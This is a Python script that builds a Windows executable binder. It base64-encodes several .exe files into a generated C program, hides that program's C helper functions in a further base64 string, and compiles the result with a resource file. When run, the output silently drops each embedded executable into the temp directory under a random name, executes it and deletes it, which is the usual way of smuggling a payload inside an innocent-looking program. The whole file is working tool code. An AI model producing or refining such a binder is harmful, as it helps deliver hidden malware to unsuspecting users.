import base64, sys, os

exe_files = sys.argv[1:]
if len(exe_files) < 2:
    input("YOU NEED 2 or more files")
    exit(1)
shell_code = []
dec = '"'
def add_newline_if_long(string):
    if len(string) > 9999:
        lines = [string[i:i+9999] for i in range(0, len(string), 9999)]
        string = '\n'.join([dec + line + dec for line in lines])
    else:
        string = dec + string + dec
    return string

for data in exe_files:
    try:
        with open(data, "rb") as file:
            binary_data = file.read()
            encoded_data = base64.b64encode(binary_data).decode('utf-8')
            string = add_newline_if_long(encoded_data)
            shell_code.append(string)
    except Exception as e:
        print("Error combining {}\nERROR: {}".format(data,e))


insert = ""
b64vars = []
files = []
for i, code in enumerate(shell_code):
    encoded_code = code
    b64vars.append(encoded_code)
b64strings = "const char *encoded_strings[] = {{{}}};".format(", ".join(b64vars))
c_functions = "c3RhdGljIGNoYXIgZW5jb2RpbmdfdGFibGVbXSA9IHsnQScsICdCJywgJ0MnLCAnRCcsICdFJywgJ0YnLCAnRycsICdIJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnSScsICdKJywgJ0snLCAnTCcsICdNJywgJ04nLCAnTycsICdQJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnUScsICdSJywgJ1MnLCAnVCcsICdVJywgJ1YnLCAnVycsICdYJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnWScsICdaJywgJ2EnLCAnYicsICdjJywgJ2QnLCAnZScsICdmJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZycsICdoJywgJ2knLCAnaicsICdrJywgJ2wnLCAnbScsICduJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnbycsICdwJywgJ3EnLCAncicsICdzJywgJ3QnLCAndScsICd2JywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAndycsICd4JywgJ3knLCAneicsICcwJywgJzEnLCAnMicsICczJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnNCcsICc1JywgJzYnLCAnNycsICc4JywgJzknLCAnKycsICcvJ307CnN0YXRpYyBjaGFyICpkZWNvZGluZ190YWJsZSA9IE5VTEw7Cgp2b2lkIGJ1aWxkX2RlY29kaW5nX3RhYmxlKCkgewogICAgZGVjb2RpbmdfdGFibGUgPSBtYWxsb2MoMjU2KTsKICAgIGZvciAoaW50IGkgPSAwOyBpIDwgNjQ7IGkrKykKICAgICAgICBkZWNvZGluZ190YWJsZVsodW5zaWduZWQgY2hhcillbmNvZGluZ190YWJsZVtpXV0gPSBpOwp9Cgp1bnNpZ25lZCBjaGFyICpiYXNlNjRfZGVjb2RlKGNvbnN0IGNoYXIgKmRhdGEsIHNpemVfdCBpbnB1dF9sZW5ndGgsIHNpemVfdCAqb3V0cHV0X2xlbmd0aCkgewogICAgaWYgKGRlY29kaW5nX3RhYmxlID09IE5VTEwpCiAgICAgICAgYnVpbGRfZGVjb2RpbmdfdGFibGUoKTsKICAgIGlmIChpbnB1dF9sZW5ndGggJSA0ICE9IDApCiAgICAgICAgcmV0dXJuIE5VTEw7CiAgICAqb3V0cHV0X2xlbmd0aCA9IGlucHV0X2xlbmd0aCAvIDQgKiAzOwogICAgaWYgKGRhdGFbaW5wdXRfbGVuZ3RoIC0gMV0gPT0gJz0nKQogICAgICAgICgqb3V0cHV0X2xlbmd0aCktLTsKICAgIGlmIChkYXRhW2lucHV0X2xlbmd0aCAtIDJdID09ICc9JykKICAgICAgICAoKm91dHB1dF9sZW5ndGgpLS07CiAgICB1bnNpZ25lZCBjaGFyICpkZWNvZGVkX2RhdGEgPSBtYWxsb2MoKm91dHB1dF9sZW5ndGggKyAxKTsKICAgIGlmIChkZWNvZGVkX2RhdGEgPT0gTlVMTCkKICAgICAgICByZXR1cm4gTlVMTDsKICAgIGZvciAoaW50IGkgPSAwLCBqID0gMDsgaSA8IGlucHV0X2xlbmd0aDspIHsKICAgICAgICB1aW50MzJfdCBzZXh0ZXRfYSA9IGRhdGFbaV0gPT0gJz0nID8gMCAmIGkrKyA6IGRlY29kaW5nX3RhYmxlW2RhdGFbaSsrXV07CiAgICAgICAgdWludDMyX3Qgc2V4dGV0X2IgPSBkYXRhW2ldID09ICc9JyA/IDAgJiBpKysgOiBkZWNvZGluZ190YWJsZVtkYXRhW2krK11dOwogICAgICAgIHVpbnQzMl90IHNleHRldF9jID0gZGF0YVtpXSA9PSAnPScgPyAwICYgaSsrIDogZGVjb2RpbmdfdGFibGVbZGF0YVtpKytdXTsKICAgICAgICB1aW50MzJfdCBzZXh0ZXRfZCA9IGRhdGFbaV0gPT0gJz0nID8gMCAmIGkrKyA6IGRlY29kaW5nX3RhYmxlW2RhdGFbaSsrXV07CiAgICAgICAgdWludDMyX3QgdHJpcGxlID0gKHNleHRldF9hIDw8IDMgKiA2KSArIChzZXh0ZXRfYiA8PCAyICogNikgKyAoc2V4dGV0X2MgPDwgMSAqIDYpICsgKHNleHRldF9kIDw8IDAgKiA2KTsKICAgICAgICBpZiAoaiA8ICpvdXRwdXRfbGVuZ3RoKQogICAgICAgICAgICBkZWNvZGVkX2RhdGFbaisrXSA9ICh0cmlwbGUgPj4gMiAqIDgpICYgMHhGRjsKICAgICAgICBpZiAoaiA8ICpvdXRwdXRfbGVuZ3RoKQogICAgICAgICAgICBkZWNvZGVkX2RhdGFbaisrXSA9ICh0cmlwbGUgPj4gMSAqIDgpICYgMHhGRjsKICAgICAgICBpZiAoaiA8ICpvdXRwdXRfbGVuZ3RoKQogICAgICAgICAgICBkZWNvZGVkX2RhdGFbaisrXSA9ICh0cmlwbGUgPj4gMCAqIDgpICYgMHhGRjsKICAgIH0KICAgIGRlY29kZWRfZGF0YVsqb3V0cHV0X2xlbmd0aF0gPSAnXDAnOwogICAgcmV0dXJuIGRlY29kZWRfZGF0YTsKfQoKdm9pZCBiYXNlNjRfY2xlYW51cCgpIHsKICAgIGZyZWUoZGVjb2RpbmdfdGFibGUpOwp9CgoKaW50IGZpbGVFeGlzdHMoY29uc3QgY2hhciAqZmlsZW5hbWUpIHsKICAgIHJldHVybiBfYWNjZXNzKGZpbGVuYW1lLCAwKSA9PSAwOwp9CgpjaGFyKiBnZW5lcmF0ZV9maWxlKCkgewogICAgLy8gU2VlZCB0aGUgcmFuZG9tIG51bWJlciBnZW5lcmF0b3IKICAgIHNyYW5kKHRpbWUoTlVMTCkpOwoKICAgIC8vIEdldCB0aGUgdGVtcG9yYXJ5IGRpcmVjdG9yeSBwYXRoCiAgICBjaGFyIHRlbXBfcGF0aFtNQVhfUEFUSF07CiAgICBEV09SRCBwYXRoX2xlbmd0aCA9IEdldFRlbXBQYXRoQShNQVhfUEFUSCwgdGVtcF9wYXRoKTsKCiAgICBpZiAocGF0aF9sZW5ndGggPT0gMCkgewogICAgICAgIHByaW50ZigiRmFpbGVkIHRvIHJldHJpZXZlIHRoZSB0ZW1wb3JhcnkgZGlyZWN0b3J5IHBhdGguXG4iKTsKICAgICAgICByZXR1cm4gTlVMTDsKICAgIH0KCiAgICAvLyBHZW5lcmF0ZSBhIHJhbmRvbSBudW1iZXIKICAgIGludCByYW5kb21fbnVtYmVyOwogICAgY2hhciByYW5kb21fc3RyaW5nWzIwXTsKICAgIGNoYXIqIGZpbGVuYW1lID0gTlVMTDsKCiAgICBkbyB7CiAgICAgICAgcmFuZG9tX251bWJlciA9IHJhbmQoKTsKCiAgICAgICAgLy8gQ29udmVydCB0aGUgcmFuZG9tIG51bWJlciB0byBhIHN0cmluZwogICAgICAgIHNwcmludGYocmFuZG9tX3N0cmluZywgIiVkIiwgcmFuZG9tX251bWJlcik7CgogICAgICAgIC8vIENvbmNhdGVuYXRlICIuZXhlIiB3aXRoIHRoZSByYW5kb20gc3RyaW5nIGFuZCB0ZW1wb3JhcnkgZGlyZWN0b3J5IHBhdGgKICAgICAgICBzaXplX3QgZmlsZW5hbWVfbGVuZ3RoID0gc3RybGVuKHRlbXBfcGF0aCkgKyBzdHJsZW4ocmFuZG9tX3N0cmluZykgKyBzdHJsZW4oIi5leGUiKSArIDE7CiAgICAgICAgZmlsZW5hbWUgPSAoY2hhciopbWFsbG9jKGZpbGVuYW1lX2xlbmd0aCk7CiAgICAgICAgaWYgKGZpbGVuYW1lID09IE5VTEwpIHsKICAgICAgICAgICAgcHJpbnRmKCJNZW1vcnkgYWxsb2NhdGlvbiBmYWlsZWQuXG4iKTsKICAgICAgICAgICAgcmV0dXJuIE5VTEw7CiAgICAgICAgfQoKICAgICAgICBzdHJjcHkoZmlsZW5hbWUsIHRlbXBfcGF0aCk7CiAgICAgICAgc3RyY2F0KGZpbGVuYW1lLCByYW5kb21fc3RyaW5nKTsKICAgICAgICBzdHJjYXQoZmlsZW5hbWUsICIuZXhlIik7CiAgICB9IHdoaWxlIChmaWxlRXhpc3RzKGZpbGVuYW1lKSk7CgogICAgLy8gUHJpbnQgdGhlIGdlbmVyYXRlZCBmaWxlbmFtZQogICAgcHJpbnRmKCJHZW5lcmF0ZWQgRmlsZW5hbWU6ICVzXG4iLCBmaWxlbmFtZSk7CgogICAgcmV0dXJuIGZpbGVuYW1lOwp9CgovLyBGdW5jdGlvbiB0byBkZWNvZGUgQmFzZTY0IGRhdGEKdW5zaWduZWQgY2hhciAqYmFzZTY0X2RlY29kZShjb25zdCBjaGFyICpkYXRhLCBzaXplX3QgaW5wdXRfbGVuZ3RoLCBzaXplX3QgKm91dHB1dF9sZW5ndGgpOw=="
c_code = f"""
#include <windows.h>
#include <io.h>
#include <time.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

{base64.b64decode(c_functions).decode()}

int main() {{
{insert}
    {b64strings}
    int num_strings = sizeof(encoded_strings) / sizeof(encoded_strings[0]);

    for (int i = 0; i < num_strings; i++) {{
        const char *encoded_data = encoded_strings[i];
        size_t encoded_length = strlen(encoded_data);
        size_t decoded_length;
        unsigned char *decoded_data = base64_decode(encoded_data, encoded_length, &decoded_length);

        if (decoded_data != NULL) {{
            char str[100];
            char* tempPath = generate_file();
            FILE* execute = fopen(tempPath, "wb");
            if (execute == NULL) {{
                printf("Failed to open the temporary file.\\n");
                return 1;
            }}
            fwrite(decoded_data, sizeof(unsigned char), decoded_length, execute);
            fclose(execute);
            char command[256];
            snprintf(command, sizeof(command), "%s", tempPath);
            printf(tempPath);
            int result = system(command);
            if (result == -1) {{
                printf("Failed to execute the temporary file.\\n");
                return 1;
            }}

            // Free the memory allocated for decoded data
            if (remove(tempPath)==0) {{
                printf("REMOVAL SUCCESS");
            }}
            free(decoded_data);
            free(tempPath);
        }}
    }}

    return 0;
}}
"""

with open("file.c", "w") as f:
    f.write(c_code)

print("BUILDING. If you get an error it means C isnt installed.")
os.system("windres my.rc -O coff -o my.res")
os.system("gcc file.c my.res -o file.exe")
print("WARNING OPENING THE C PROGRAM ON A DIFFERENT IDE CAN BREAK THE PROGRAM.")